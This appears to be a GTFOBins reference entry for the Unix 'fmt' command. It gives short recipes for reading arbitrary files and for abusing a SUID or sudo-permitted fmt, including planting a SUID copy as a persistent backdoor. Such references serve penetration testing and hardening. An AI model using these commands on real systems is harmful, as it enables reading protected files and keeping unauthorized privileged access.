# GTFOBin: fmt

The read file content is not binary-safe.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

This only works for the GNU version of `fmt`.

```
LFILE=file_to_read
fmt -pNON_EXISTING_PREFIX "$LFILE"
```

This corrupts the output by wrapping very long lines at the given width.

```
LFILE=file_to_read
fmt -999 "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This corrupts the output by wrapping very long lines at the given width.

```
sudo install -m =xs $(which fmt) .

LFILE=file_to_read
./fmt -999 "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This corrupts the output by wrapping very long lines at the given width.

```
LFILE=file_to_read
sudo fmt -999 "$LFILE"
```